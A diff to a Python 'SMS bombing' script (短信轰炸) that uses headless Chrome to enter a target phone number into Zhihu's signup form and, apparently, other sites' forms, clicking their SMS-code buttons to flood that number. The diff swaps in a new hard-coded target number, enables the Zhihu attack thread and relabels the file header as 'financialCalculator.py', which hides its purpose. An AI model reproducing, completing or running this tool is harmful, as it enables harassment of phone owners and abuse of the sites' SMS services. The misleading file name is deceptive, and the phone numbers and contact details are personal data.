@@ -1,17 +1,17 @@
 """
- !/usr/bin/python3
+ !/usr/bin/env python3.6
  -*- coding: utf-8 -*-
- --------------------------------------
- @File    	  : hongzha.py
- @Time    	  : 2018/8/25 12:28
- @Software	  : PyCharm
  --------------------------------------
  @Description : 短信轰炸
                 1. chromedriver.exe 放入到指定的文件路径下
                 2. 版本对应
  --------------------------------------
- @Author  	  : lixj
- @Contact  	  : lixj_zj@163.com
+ @File        : financialCalculator.py
+ @Time        : 2018/8/25 12:28
+ @Software    : PyCharm
+ --------------------------------------
+ @Author      : lixj
+ @Contact     : lixj_zj@163.com
  --------------------------------------
 """
 
@@ -21,7 +21,7 @@ from threading import Thread
 
 class hongZha():
     def __init__(self):
-        self.target_phone = "15850592482"   # phone
+        self.target_phone = "13636466080"   # phone
         self.num = 0    # number
         self.chrome_options = webdriver.ChromeOptions()
         self.chrome_options.add_argument('--headless')
@@ -37,11 +37,10 @@ class hongZha():
 
     # 1.
     def zhihu(self, name):
-        time.sleep(3)
         self.driver.get("https://www.zhihu.com/signup")
+        self.driver.find_element_by_xpath("//button[@class='Button Button--primary Button--blue']").click()
         time.sleep(3)
         tel = self.driver.find_element_by_xpath("//input[@placeholder='手机号']")
-        print(tel)
         tel.send_keys(self.target_phone)
         button = self.driver.find_element_by_xpath("//button[@class='Button CountingDownButton SignFlow-smsInputButton Button--plain']")
         self.send_result(button, name)
@@ -77,8 +76,8 @@ class hongZha():
 if __name__ == '__main__':
     hongZha = hongZha()
 
-    # zh = Thread(target=hongZha.zhihu, args=("zhihu", ))
-    # zh.start()
+    zh = Thread(target=hongZha.zhihu, args=("zhihu", ))
+    zh.start()
 
     # wph = Thread(target=hongZha.weipinhui, args=("weipinhui", ))
     # wph.start()
@@ -86,8 +85,8 @@ if __name__ == '__main__':
     # sn = Thread(target=hongZha.suning, args=("suning", ))
     # sn.start()
 
-    mail163 = Thread(target=hongZha.mail163, args=("mail163", ))
-    mail163.start()
+    # mail163 = Thread(target=hongZha.mail163, args=("mail163", ))
+    # mail163.start()
 
 
 
